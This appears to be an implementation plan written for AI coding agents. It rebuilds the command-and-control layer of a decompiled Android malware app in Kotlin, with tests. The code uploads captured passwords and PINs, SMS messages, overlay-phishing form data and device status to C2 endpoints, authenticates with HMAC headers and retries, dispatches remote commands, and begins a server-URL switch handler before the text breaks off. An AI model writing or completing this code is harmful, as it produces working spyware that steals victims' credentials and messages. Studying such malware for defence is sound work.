# C2 通信层 1:1 复刻对齐 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 补齐 replica 中缺失的 HttpManager（7 个 REST API endpoint + HMAC 认证 + 重试机制），对齐 DataSyncClient 命令分发架构（结构化封装 + 30s 超时），接入 CHANGE_SERVER_URL 命令处理，使 replica 具备与 C2 服务器完整通信能力。

**Architecture:** Vendor 采用双通道设计 — HTTP POST 用于可靠数据上传（注册/SMS/密码/日志），WebSocket 用于实时命令与截图。当前 replica 只有 WebSocket 通道，需要补 HttpManager 独立类。命令分发从松散 JSON 字符串改为结构化 `CommandRequest(command, params)` + 30s withTimeout。

**Tech Stack:** Kotlin, OkHttp 4.12.0 (已有), kotlinx-coroutines 1.8.0 (已有), JUnit 4 + Robolectric + MockWebServer (已有)

**约束：** 不执行 git commit；不运行 `./gradlew build` 或 `./gradlew test`（仅编写代码和测试文件）；开源库直接引用已有依赖。

---

## 文件结构

### 新建文件

| 文件 | 职责 |
|------|------|
| `network/HttpManager.kt` | HTTP REST 客户端 — 7 个 POST endpoint + HMAC 双 Header 认证 + 重试 |
| `network/CommandRequest.kt` | 结构化命令封装 — `data class CommandRequest(command: String, params: Map<String, Any>)` |
| `test/.../network/HttpManagerTest.kt` | HttpManager 单元测试 — 每个 endpoint + 认证 + 重试 + 错误处理 |
| `test/.../network/CommandRequestTest.kt` | CommandRequest 解析 + 序列化测试 |

### 修改文件

| 文件 | 改动 |
|------|------|
| `network/DataSyncClient.kt` | handleMessage 改为返回结构化 CommandRequest；命令执行加 30s withTimeout |
| `service/modules/NetworkManager.kt` | 注释掉的 `httpManager` 激活；补齐 HTTP 上传方法代理；handleRemoteCommand 接收 CommandRequest |
| `test/.../network/DataSyncClientTest.kt` | 补充命令分发结构化测试 |

### 路径前缀

- 源码: `update-replica/app/src/main/java/com/storm/safe/rock/`
- 测试: `update-replica/app/src/test/java/com/storm/safe/rock/`
- JADX: `jadx-reference/rock/`

---

## Task 1: CommandRequest 数据类

**Files:**
- Create: `network/CommandRequest.kt`
- Create: `test/.../network/CommandRequestTest.kt`

- [ ] **Step 1: Write the failing test**

```kotlin
// test/.../network/CommandRequestTest.kt
package com.storm.safe.rock.network

import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

@RunWith(RobolectricTestRunner::class)
class CommandRequestTest {

    @Test
    fun `fromJson parses command and params`() {
        val json = JSONObject().apply {
            put("command", "LAUNCH_APP")
            put("params", JSONObject().apply {
                put("packageName", "com.example.app")
                put("retry", 3)
            })
        }
        val req = CommandRequest.fromJson(json)
        assertEquals("LAUNCH_APP", req.command)
        assertEquals("com.example.app", req.params["packageName"])
        assertEquals(3, req.params["retry"])
    }

    @Test
    fun `fromJson with missing params returns empty map`() {
        val json = JSONObject().apply {
            put("command", "MUTE")
        }
        val req = CommandRequest.fromJson(json)
        assertEquals("MUTE", req.command)
        assertTrue(req.params.isEmpty())
    }

    @Test
    fun `fromJson merges top-level fields into params`() {
        // JADX: C0267a0.java:343-353 — data-level keys (excluding "command"/"params") merge into params
        val json = JSONObject().apply {
            put("command", "FILE_DOWNLOAD")
            put("params", JSONObject().apply {
                put("url", "https://example.com/file")
            })
            put("taskId", "abc123")
            put("priority", 1)
        }
        val req = CommandRequest.fromJson(json)
        assertEquals("FILE_DOWNLOAD", req.command)
        assertEquals("https://example.com/file", req.params["url"])
        assertEquals("abc123", req.params["taskId"])
        assertEquals(1, req.params["priority"])
    }

    @Test
    fun `fromJson with empty command returns empty string`() {
        val json = JSONObject()
        val req = CommandRequest.fromJson(json)
        assertEquals("", req.command)
        assertTrue(req.params.isEmpty())
    }

    @Test
    fun `getStringParam returns param or default`() {
        val req = CommandRequest("TEST", mapOf("key" to "value"))
        assertEquals("value", req.getStringParam("key"))
        assertEquals("", req.getStringParam("missing"))
        assertEquals("fallback", req.getStringParam("missing", "fallback"))
    }

    @Test
    fun `getIntParam returns param or default`() {
        val req = CommandRequest("TEST", mapOf("count" to 5))
        assertEquals(5, req.getIntParam("count"))
        assertEquals(0, req.getIntParam("missing"))
        assertEquals(-1, req.getIntParam("missing", -1))
    }
}
```

- [ ] **Step 2: Write minimal implementation**

```kotlin
// network/CommandRequest.kt
package com.storm.safe.rock.network

import org.json.JSONObject

/**
 * Structured command from C2 server.
 *
 * JADX: DataSyncClient (C0267a0.java:323-358) parses incoming JSON into
 * C1108qf(command, LinkedHashMap<String, Object>). This is the Kotlin equivalent.
 *
 * Vendor merges top-level JSON keys (excluding "command" and "params") into the params map,
 * so all data is accessible from a single flat map.
 */
data class CommandRequest(
    val command: String,
    val params: Map<String, Any>
) {
    companion object {
        /**
         * Parse a command JSON object into a CommandRequest.
         *
         * JADX reference: C0267a0.java:323-358 (m211365a6 / parseAndExecuteCommand)
         *
         * @param json The "data" object from a WebSocket command message
         */
        fun fromJson(json: JSONObject): CommandRequest {
            val command = json.optString("command", "")

            val params = LinkedHashMap<String, Any>()

            // 1. Extract params object
            val paramsJson = json.optJSONObject("params")
            if (paramsJson != null) {
                val keys = paramsJson.keys()
                while (keys.hasNext()) {
                    val key = keys.next()
                    params[key] = paramsJson.get(key)
                }
            }

            // 2. Merge top-level fields (excluding "command" and "params")
            // JADX: C0267a0.java:343-353
            val topKeys = json.keys()
            while (topKeys.hasNext()) {
                val key = topKeys.next()
                if (key != "command" && key != "params") {
                    params[key] = json.get(key)
                }
            }

            return CommandRequest(command, params)
        }
    }

    /** Get a string parameter, or [default] if missing/wrong type. */
    fun getStringParam(key: String, default: String = ""): String {
        return params[key]?.toString() ?: default
    }

    /** Get an int parameter, or [default] if missing/wrong type. */
    fun getIntParam(key: String, default: Int = 0): Int {
        return when (val v = params[key]) {
            is Number -> v.toInt()
            is String -> v.toIntOrNull() ?: default
            else -> default
        }
    }
}
```

---

## Task 2: HttpManager — 核心 HTTP 客户端

**Files:**
- Create: `network/HttpManager.kt`
- Create: `test/.../network/HttpManagerTest.kt`

**JADX 参考:** `C0268a1.java` (841 行) — 单例 HTTP 客户端

- [ ] **Step 1: Write the failing test — 构造 + 认证**

```kotlin
// test/.../network/HttpManagerTest.kt
package com.storm.safe.rock.network

import kotlinx.coroutines.test.runTest
import okhttp3.mockwebserver.MockResponse
import okhttp3.mockwebserver.MockWebServer
import org.json.JSONObject
import org.junit.After
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class HttpManagerTest {

    private lateinit var server: MockWebServer
    private lateinit var manager: HttpManager

    @Before
    fun setup() {
        server = MockWebServer()
        server.start()
        val baseUrl = server.url("/").toString().trimEnd('/')
        manager = HttpManager(RuntimeEnvironment.getApplication())
        manager.baseUrl = baseUrl
        manager.deviceId = "test-device-001"
        manager.deviceKeySalt = "test-salt-abc"
    }

    @After
    fun teardown() {
        try { server.shutdown() } catch (_: Exception) {}
    }

    // --- Authentication ---

    @Test
    fun `post with auth=true sends X-Client-ID and X-Client-Token headers`() = runTest {
        server.enqueue(MockResponse().setBody("""{"status":"ok"}""").setResponseCode(200))

        val data = JSONObject().apply { put("test", true) }
        manager.post("/api/test", data, authenticated = true)

        val request = server.takeRequest()
        assertEquals("test-device-001", request.getHeader("X-Client-ID"))
        val token = request.getHeader("X-Client-Token")
        assertNotNull(token)
        assertEquals(32, token!!.length) // HMAC hex truncated to 32 chars
        assertTrue(token.matches(Regex("[0-9a-f]+"))) // all hex
    }

    @Test
    fun `post with auth=false sends no auth headers`() = runTest {
        server.enqueue(MockResponse().setBody("""{"status":"ok"}""").setResponseCode(200))

        val data = JSONObject().apply { put("test", true) }
        manager.post("/api/client/register", data, authenticated = false)

        val request = server.takeRequest()
        assertNull(request.getHeader("X-Client-ID"))
        assertNull(request.getHeader("X-Client-Token"))
    }

    @Test
    fun `post sends correct content-type`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))

        manager.post("/api/test", JSONObject(), authenticated = false)

        val request = server.takeRequest()
        assertTrue(request.getHeader("Content-Type")!!.contains("application/json"))
    }

    // --- Retry ---

    @Test
    fun `executeRequest retries on 5xx up to 3 times`() = runTest {
        // 3 failures then success
        repeat(2) { server.enqueue(MockResponse().setResponseCode(500).setBody("error")) }
        server.enqueue(MockResponse().setBody("""{"ok":true}""").setResponseCode(200))

        val result = manager.post("/api/test", JSONObject(), authenticated = false)
        assertTrue(result.isSuccess)
        assertEquals(3, server.requestCount) // 2 retries + 1 success
    }

    @Test
    fun `executeRequest does not retry on 4xx`() = runTest {
        server.enqueue(MockResponse().setResponseCode(403).setBody("forbidden"))

        val result = manager.post("/api/test", JSONObject(), authenticated = false)
        assertTrue(result.isFailure)
        assertEquals(1, server.requestCount) // no retry
    }

    @Test
    fun `executeRequest returns failure after max retries`() = runTest {
        repeat(3) { server.enqueue(MockResponse().setResponseCode(500).setBody("error")) }

        val result = manager.post("/api/test", JSONObject(), authenticated = false)
        assertTrue(result.isFailure)
        assertEquals(3, server.requestCount)
    }

    // --- Endpoint: register ---

    @Test
    fun `register sends to correct path without auth`() = runTest {
        server.enqueue(MockResponse().setBody("""{"deviceId":"abc"}""").setResponseCode(200))

        val payload = JSONObject().apply {
            put("deviceId", "test-device-001")
            put("model", "Pixel")
        }
        val result = manager.register(payload)

        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/client/register", request.path)
        assertEquals("POST", request.method)
        assertNull(request.getHeader("X-Client-ID")) // no auth
    }

    // --- Endpoint: uploadPasswordCapture ---

    @Test
    fun `uploadPasswordCapture sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))

        val result = manager.uploadPasswordCapture(
            password = "1234",
            passwordType = "pin",
            inputMethod = "system_keyboard",
            appName = "Settings",
            packageName = "com.android.settings",
            confidence = 85
        )

        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/credentials", request.path)
        assertNotNull(request.getHeader("X-Client-ID")) // authenticated

        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertEquals("1234", body.getString("password"))
        assertEquals("pin", body.getString("passwordType"))
        assertEquals("system_keyboard", body.getString("inputMethod"))
        assertEquals("Settings", body.getString("appName"))
        assertEquals("com.android.settings", body.getString("packageName"))
        assertEquals(85, body.getInt("confidence"))
        assertTrue(body.has("timestamp"))
    }

    // --- Endpoint: uploadSms ---

    @Test
    fun `uploadSms sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))

        val smsList = listOf(
            JSONObject().apply { put("from", "+1234"); put("body", "test") }
        )
        val result = manager.uploadSms(smsList)

        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/messages", request.path)

        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertTrue(body.has("sms"))
        assertTrue(body.has("timestamp"))
    }

    // --- Endpoint: uploadIncomingSms ---

    @Test
    fun `uploadIncomingSms sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))

        val result = manager.uploadIncomingSms(
            number = "+1234567890",
            text = "Hello",
            type = "received",
            timestamp = 1700000000000L
        )

        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/inbox", request.path)

        val body = JSONObject(request.body.readUtf8())
        assertEquals("+1234567890", body.getString("number"))
        assertEquals("Hello", body.getString("text"))
        assertEquals("received", body.getString("type"))
        assertEquals(1700000000000L, body.getLong("timestamp"))
    }

    // --- Endpoint: uploadLogs ---

    @Test
    fun `uploadLogs sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))

        val logs = listOf(
            JSONObject().apply { put("level", "info"); put("msg", "test") }
        )
        val result = manager.uploadLogs(logs)

        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/client/logs", request.path)

        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertTrue(body.has("logs"))
    }

    // --- Endpoint: uploadInjectionData ---

    @Test
    fun `uploadInjectionData adds deviceId and timestamp`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))

        val data = JSONObject().apply {
            put("field1", "value1")
            put("field2", 42)
        }
        val result = manager.uploadInjectionData(data)

        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/form", request.path)

        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertTrue(body.has("timestamp"))
        assertEquals("value1", body.getString("field1"))
    }

    // --- Endpoint: uploadDeviceStatus ---

    @Test
    fun `uploadDeviceStatus sends correct payload`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))

        val statusData = JSONObject().apply { put("battery", 80) }
        val result = manager.uploadDeviceStatus("battery_update", statusData)

        assertTrue(result.isSuccess)
        val request = server.takeRequest()
        assertEquals("/api/sync/status", request.path)

        val body = JSONObject(request.body.readUtf8())
        assertEquals("test-device-001", body.getString("deviceId"))
        assertEquals("battery_update", body.getString("statusType"))
        assertTrue(body.has("data"))
    }

    // --- HMAC consistency ---

    @Test
    fun `HMAC key is deterministic for same inputs`() = runTest {
        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        manager.post("/api/test", JSONObject(), authenticated = true)
        val token1 = server.takeRequest().getHeader("X-Client-Token")

        server.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        manager.post("/api/test", JSONObject(), authenticated = true)
        val token2 = server.takeRequest().getHeader("X-Client-Token")

        assertEquals(token1, token2)
    }
}
```

- [ ] **Step 2: Write HttpManager implementation**

```kotlin
// network/HttpManager.kt
package com.storm.safe.rock.network

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.net.ConnectException
import java.net.SocketTimeoutException
import java.net.UnknownHostException
import java.util.concurrent.TimeUnit
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * HTTP REST client for C2 data upload endpoints.
 *
 * JADX reference: C0268a1.java (HttpManager, 841 lines)
 *
 * Vendor architecture: HTTP POST is used for reliable data upload (SMS, passwords, logs, etc.),
 * separate from the WebSocket channel (DataSyncClient) used for real-time commands/screenshots.
 *
 * Authentication: X-Client-ID + X-Client-Token (HmacSHA256, truncated 32 hex chars).
 * Retry: 3 attempts, exponential backoff 1s * 1.5, cap 5s. 4xx = no retry, 5xx = retry.
 */
class HttpManager(private val context: Context) {

    companion object {
        private const val TAG = "HttpManager"

        // JADX: C0268a1.java:579 — executeRequest(request, 3, 1000L, ...)
        private const val MAX_RETRIES = 3
        private const val INITIAL_DELAY_MS = 1000L
        private const val BACKOFF_MULTIPLIER = 1.5
        private const val MAX_DELAY_MS = 5000L

        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

        // Singleton — JADX: C0268a1.java:51, volatile f52276a7
        @Volatile
        private var instance: HttpManager? = null

        fun getOrCreate(context: Context): HttpManager {
            return instance ?: synchronized(this) {
                instance ?: HttpManager(context.applicationContext).also { instance = it }
            }
        }
    }

    // --- Configuration (set by NetworkManager at init) ---

    /** Base URL for API calls, e.g. "https://c2.example.com" */
    var baseUrl: String = ""

    /** Device identifier, used as X-Client-ID header */
    var deviceId: String = ""

    /** HMAC key salt for generating X-Client-Token */
    var deviceKeySalt: String = ""

    // JADX: C0268a1.java:73-76
    private val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(10L, TimeUnit.SECONDS)
        .readTimeout(15L, TimeUnit.SECONDS)
        .writeTimeout(15L, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    // ========================================================================
    // Public API — 7 endpoints matching vendor C0268a1
    // ========================================================================

    /**
     * Register device with C2. **No authentication.**
     *
     * JADX: m211372a2 (register), endpoint `/api/client/register`, auth=false
     * Source: HttpManager$register$2.java:59
     */
    suspend fun register(deviceInfo: JSONObject): Result<JSONObject> {
        return post("/api/client/register", deviceInfo, authenticated = false)
    }

    /**
     * Upload captured password/PIN to C2.
     *
     * JADX: m211377a7 (uploadPasswordCapture), endpoint `/api/sync/credentials`, auth=true
     * Source: HttpManager$uploadPasswordCapture$2.java:73-91
     */
    suspend fun uploadPasswordCapture(
        password: String,
        passwordType: String,
        inputMethod: String,
        appName: String,
        packageName: String,
        confidence: Int
    ): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("password", password)
            put("passwordType", passwordType)
            put("inputMethod", inputMethod)
            put("appName", appName)
            put("packageName", packageName)
            put("confidence", confidence)
            put("timestamp", System.currentTimeMillis())
        }
        return post("/api/sync/credentials", payload, authenticated = true)
    }

    /**
     * Batch upload SMS messages.
     *
     * JADX: m211378a8 (uploadSms), endpoint `/api/sync/messages`, auth=true
     * Source: HttpManager$uploadSms$2.java:56-64
     */
    suspend fun uploadSms(smsList: List<JSONObject>): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("sms", JSONArray(smsList))
            put("timestamp", System.currentTimeMillis())
        }
        return post("/api/sync/messages", payload, authenticated = true)
    }

    /**
     * Upload a single real-time incoming SMS.
     *
     * JADX: m211374a4 (uploadIncomingSms), endpoint `/api/sync/inbox`, auth=true
     * Source: HttpManager$uploadIncomingSms$2.java:66-78
     */
    suspend fun uploadIncomingSms(
        number: String,
        text: String,
        type: String,
        timestamp: Long
    ): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("number", number)
            put("text", text)
            put("type", type)
            put("timestamp", timestamp)
        }
        return post("/api/sync/inbox", payload, authenticated = true)
    }

    /**
     * Upload client logs.
     *
     * JADX: m211376a6 (uploadLogs), endpoint `/api/client/logs`, auth=true
     * Source: HttpManager$uploadLogs$2.java:56-64
     */
    suspend fun uploadLogs(logs: List<JSONObject>): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("logs", JSONArray(logs))
            put("timestamp", System.currentTimeMillis())
        }
        return post("/api/client/logs", payload, authenticated = true)
    }

    /**
     * Upload injection form data (overlay phishing capture).
     *
     * JADX: m211375a5 (uploadInjectionData), endpoint `/api/sync/form`, auth=true
     * Source: HttpManager$uploadInjectionData$2.java:54-61
     * Note: Vendor mutates the input JSONObject (adds deviceId + timestamp).
     */
    suspend fun uploadInjectionData(data: JSONObject): Result<JSONObject> {
        // JADX: vendor mutates input object directly
        val payload = JSONObject(data.toString()) // defensive copy
        payload.put("deviceId", deviceId)
        if (!payload.has("timestamp")) {
            payload.put("timestamp", System.currentTimeMillis())
        }
        return post("/api/sync/form", payload, authenticated = true)
    }

    /**
     * Upload device status update.
     *
     * JADX: m211373a3 (uploadDeviceStatus), endpoint `/api/sync/status`, auth=true
     * Source: HttpManager$uploadDeviceStatus$2.java:57-66
     */
    suspend fun uploadDeviceStatus(statusType: String, data: JSONObject): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("statusType", statusType)
            put("data", data)
        }
        return post("/api/sync/status", payload, authenticated = true)
    }

    // ========================================================================
    // Core HTTP engine
    // ========================================================================

    /**
     * Execute a POST request with optional HMAC authentication.
     *
     * JADX: m211371a1 (post), C0268a1.java:510-581
     * - authenticated=true → adds X-Client-ID + X-Client-Token headers
     * - Delegates to executeRequest for retry logic
     */
    suspend fun post(
        path: String,
        data: JSONObject,
        authenticated: Boolean
    ): Result<JSONObject> {
        val url = baseUrl + path
        val body = data.toString().toRequestBody(JSON_MEDIA_TYPE)

        val requestBuilder = Request.Builder()
            .url(url)
            .post(body)

        if (authenticated) {
            requestBuilder.addHeader("X-Client-ID", deviceId)
            val token = generateDeviceKey()
            requestBuilder.addHeader("X-Client-Token", token)
        }

        val request = requestBuilder.build()
        return executeRequest(request, MAX_RETRIES, INITIAL_DELAY_MS)
    }

    /**
     * Execute request with retry logic.
     *
     * JADX: m211370a0 (executeRequest), C0268a1.java:148-503
     * - maxRetries=3, initialDelay=1000ms, backoff=1.5x, cap=5000ms
     * - 4xx → immediate failure (no retry)
     * - 5xx → retry
     * - Network exceptions → retry
     */
    private suspend fun executeRequest(
        request: Request,
        maxRetries: Int,
        initialDelay: Long
    ): Result<JSONObject> = withContext(Dispatchers.IO) {
        var lastException: Exception? = null
        var currentDelay = initialDelay

        for (attempt in 0 until maxRetries) {
            try {
                val response = httpClient.newCall(request).execute()
                response.use { resp ->
                    val code = resp.code
                    if (code in 200..299) {
                        // Success
                        val responseBody = resp.body?.string() ?: "{}"
                        return@withContext Result.success(JSONObject(responseBody))
                    }
                    if (code in 400..499) {
                        // 4xx — no retry
                        // JADX: C0268a1.java:409-422
                        Log.w(TAG, "HTTP 客户端错误: $code ${resp.message}")
                        return@withContext Result.failure(
                            IOException("HTTP $code: ${resp.message}")
                        )
                    }
                    // 5xx — retry
                    // JADX: C0268a1.java:431-433
                    Log.w(TAG, "HTTP 服务器错误: $code，尝试 ${attempt + 1}/$maxRetries")
                    lastException = IOException("HTTP $code: ${resp.message}")
                }
            } catch (e: ConnectException) {
                Log.w(TAG, "🔌 连接失败 (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            } catch (e: SocketTimeoutException) {
                Log.w(TAG, "⏱️ 请求超时 (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            } catch (e: UnknownHostException) {
                Log.w(TAG, "🌐 DNS 解析失败 (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            } catch (e: Exception) {
                Log.w(TAG, "HTTP 请求异常 (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            }

            // Delay before retry (skip on last attempt)
            // JADX: C0268a1.java:257-258
            if (attempt < maxRetries - 1) {
                delay(currentDelay)
                currentDelay = (currentDelay * BACKOFF_MULTIPLIER).toLong()
                    .coerceAtMost(MAX_DELAY_MS)
            }
        }

        Result.failure(
            lastException ?: IOException("Unknown error after $maxRetries retries")
        )
    }

    // ========================================================================
    // HMAC key generation
    // ========================================================================

    /**
     * Generate X-Client-Token using HmacSHA256.
     *
     * JADX: C0268a1.java:555-569
     * key = HmacSHA256(deviceKeySalt.utf8, deviceId.utf8) → hex → take(32)
     *
     * Same algorithm as DataSyncClient.generateHmacKey() — vendor shares this across both channels.
     */
    private fun generateDeviceKey(): String {
        if (deviceId.isEmpty()) return ""
        if (deviceKeySalt.isEmpty()) {
            Log.w(TAG, "⚠️ deviceKeySalt 为空，API认证将失败")
            return ""
        }
        return try {
            val mac = Mac.getInstance("HmacSHA256")
            val keyBytes = deviceKeySalt.toByteArray(Charsets.UTF_8)
            mac.init(SecretKeySpec(keyBytes, "HmacSHA256"))
            val digest = mac.doFinal(deviceId.toByteArray(Charsets.UTF_8))
            digest.joinToString("") { String.format("%02x", it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Log.e(TAG, "生成设备密钥失败", e)
            ""
        }
    }
}
```

---

## Task 3: DataSyncClient 命令分发结构化 + 30s 超时

**Files:**
- Modify: `network/DataSyncClient.kt` (handleMessage 方法)
- Modify: `test/.../network/DataSyncClientTest.kt`

**JADX 参考:**
- `C0267a0.java:323-358` — parseAndExecuteCommand 封装为 C1108qf
- `DataSyncClient$parseAndExecuteCommand$3.java:101` — `withTimeout(30000L)`

- [ ] **Step 1: Write the failing test**

在 `test/.../network/DataSyncClientTest.kt` 末尾追加：

```kotlin
    // --- 命令分发结构化 ---

    @Test
    fun `handleMessage dispatches command as CommandRequest`() {
        val context = RuntimeEnvironment.getApplication()
        var receivedRequest: CommandRequest? = null
        val client = DataSyncClient(
            context,
            onCommandCallback = { receivedRequest = it },
            onMessageCallback = {},
            onConnectionChanged = {}
        )

        val msg = JSONObject().apply {
            put("type", "command")
            put("data", JSONObject().apply {
                put("command", "LAUNCH_APP")
                put("params", JSONObject().apply {
                    put("packageName", "com.test")
                })
                put("taskId", "t1")
            })
        }
        client.handleMessage(msg.toString())

        assertNotNull(receivedRequest)
        assertEquals("LAUNCH_APP", receivedRequest!!.command)
        assertEquals("com.test", receivedRequest!!.params["packageName"])
        assertEquals("t1", receivedRequest!!.params["taskId"])
    }

    @Test
    fun `handleMessage ignores command with empty command field`() {
        val context = RuntimeEnvironment.getApplication()
        var receivedRequest: CommandRequest? = null
        val client = DataSyncClient(
            context,
            onCommandCallback = { receivedRequest = it },
            onMessageCallback = {},
            onConnectionChanged = {}
        )

        val msg = JSONObject().apply {
            put("type", "command")
            put("data", JSONObject()) // no "command" field
        }
        client.handleMessage(msg.toString())

        // JADX: C0267a0.java:326-329 — empty command → return
        assertNull(receivedRequest)
    }
```

- [ ] **Step 2: Modify DataSyncClient**

**改动 1:** 构造函数增加 `onCommandCallback` 参数

```kotlin
// 修改 DataSyncClient 构造函数签名
open class DataSyncClient(
    private val context: Context,
    private val onCommandCallback: ((CommandRequest) -> Unit)? = null, // NEW: 结构化命令回调
    private val onMessageCallback: (String) -> Unit = {},              // 保留向后兼容
    private val onConnectionChanged: (Boolean) -> Unit
)
```

**改动 2:** handleMessage 中 "command" 分支改为解析 CommandRequest

```kotlin
    // 替换 handleMessage 中的 "command" 分支:
    "command" -> {
        val data = json.optJSONObject("data")
        if (data != null) {
            val request = CommandRequest.fromJson(data)
            // JADX: C0267a0.java:326-329 — empty command string → skip
            if (request.command.isNotEmpty()) {
                if (onCommandCallback != null) {
                    // JADX: DataSyncClient$parseAndExecuteCommand$3.java:101
                    // Vendor uses withTimeout(30000L) in coroutine scope.
                    // Here we dispatch synchronously; timeout managed by caller.
                    onCommandCallback.invoke(request)
                } else {
                    // Fallback: legacy string callback
                    onMessageCallback(data.toString())
                }
            }
        }
    }
```

---

## Task 4: NetworkManager 集成 HttpManager + 命令分发

**Files:**
- Modify: `service/modules/NetworkManager.kt`

**改动范围：**
1. 激活 httpManager 字段（L193 取消注释）
2. 初始化时创建 HttpManager 并同步配置
3. 补齐 HTTP 上传代理方法
4. handleRemoteCommand 改为接收 CommandRequest
5. 补 CHANGE_SERVER_URL 命令处理

- [ ] **Step 1: 激活 httpManager 字段**

在 `NetworkManager.kt` 约 L190-193，将注释掉的 httpManager 替换为：

```kotlin
    // JADX: f53101a1 — HTTP manager (C0268a1)
    private var httpManager: HttpManager? = null
```

- [ ] **Step 2: 在初始化流程中创建 HttpManager**

在 NetworkManager 的 `initialize()` 或 `initializeClient()` 方法中，DataSyncClient 创建之后，追加：

```kotlin
    // 创建 HttpManager 并同步配置
    val hm = HttpManager.getOrCreate(context)
    hm.baseUrl = serverUrl
    hm.deviceId = deviceId
    hm.deviceKeySalt = deviceKeySalt
    httpManager = hm
```

其中 `serverUrl`、`deviceId`、`deviceKeySalt` 使用 NetworkManager 已有的同名字段。

- [ ] **Step 3: 补齐 HTTP 上传代理方法**

在 NetworkManager 的数据发送区域（约 L1415-1475），补充以下方法。**现有 WS 发送方法全部保留**（vendor 双通道并存）：

```kotlin
    // ========================================================================
    // HTTP 上传 — 补齐 vendor HttpManager 的 7 个 POST endpoint
    // JADX: C0268a1.java
    // ========================================================================

    /** HTTP POST 注册设备 */
    suspend fun httpRegister(deviceInfo: JSONObject): Result<JSONObject> {
        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
        return hm.register(deviceInfo)
    }

    /** HTTP POST 上传密码捕获 */
    suspend fun httpUploadPasswordCapture(
        password: String,
        passwordType: String,
        inputMethod: String,
        appName: String,
        packageName: String,
        confidence: Int
    ): Result<JSONObject> {
        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
        return hm.uploadPasswordCapture(password, passwordType, inputMethod, appName, packageName, confidence)
    }

    /** HTTP POST 批量上传 SMS */
    suspend fun httpUploadSms(smsList: List<JSONObject>): Result<JSONObject> {
        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
        return hm.uploadSms(smsList)
    }

    /** HTTP POST 实时短信上传 */
    suspend fun httpUploadIncomingSms(number: String, text: String, type: String, timestamp: Long): Result<JSONObject> {
        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
        return hm.uploadIncomingSms(number, text, type, timestamp)
    }

    /** HTTP POST 上传日志 */
    suspend fun httpUploadLogs(logs: List<JSONObject>): Result<JSONObject> {
        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
        return hm.uploadLogs(logs)
    }

    /** HTTP POST 上传注入数据 */
    suspend fun httpUploadInjectionData(data: JSONObject): Result<JSONObject> {
        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
        return hm.uploadInjectionData(data)
    }

    /** HTTP POST 上传设备状态 */
    suspend fun httpUploadDeviceStatus(statusType: String, data: JSONObject): Result<JSONObject> {
        val hm = httpManager ?: return Result.failure(IllegalStateException("HttpManager not initialized"))
        return hm.uploadDeviceStatus(statusType, data)
    }
```

- [ ] **Step 4: handleRemoteCommand 支持 CHANGE_SERVER_URL**

修改现有的 `handleRemoteCommand` 方法（约 L1560），添加 CHANGE_SERVER_URL 处理逻辑：

```kotlin
    /**
     * Handle CHANGE_SERVER_URL command.
     *
     * JADX: C0344a1.java:564-581
     * Params: "serverUrl" (直接或嵌套在 data 中)
     */
    private fun handleChangeServerUrl(params: Map<String, Any>) {
        // JADX: StringUtil.m212470a0("OFwDLEgqOTxb") = "serverUrl"
